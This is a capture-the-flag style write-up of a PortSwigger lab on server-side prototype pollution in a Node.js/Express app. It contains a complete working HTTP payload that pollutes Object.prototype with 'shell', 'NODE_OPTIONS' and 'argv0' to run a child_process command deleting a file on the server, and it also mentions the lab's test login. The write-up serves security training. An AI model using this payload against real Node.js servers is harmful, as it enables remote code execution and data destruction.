
# Remote code execution via server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:

- Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.

- Identify a gadget that you can use to inject and execute arbitrary system commands.

- Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter

Hint: The command execution sink is only invoked when an admin user triggers vulnerable functionality on the site.

Note: When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.



---------------------------------------------

References: 

- https://portswigger.net/web-security/prototype-pollution/server-side

- https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce



![img](images/Remote%20code%20execution%20via%20server-side%20prototype%20pollution/1.png)

---------------------------------------------

First I set the “shell” and “NODE_OPTIONS” properties so any time a process is created there is a DNS request to a Burp collaborator domain:



![img](images/Remote%20code%20execution%20via%20server-side%20prototype%20pollution/2.png)


In /admin, click “Run maintenance jobs”:



![img](images/Remote%20code%20execution%20via%20server-side%20prototype%20pollution/3.png)


And the domain is resolved:



![img](images/Remote%20code%20execution%20via%20server-side%20prototype%20pollution/4.png)


After some trial and error I could execute a command to delete the file with this payload:

```
POST /my-account/change-address HTTP/2

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"9w2wz2qtX8He4ofWjxuo5Lv3cGj49UjN","__proto__": {  "shell":"",    "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\"child_process\").execSync(\"rm /home/carlos/morale.txt\").toString())//"}}
```



![img](images/Remote%20code%20execution%20via%20server-side%20prototype%20pollution/5.png)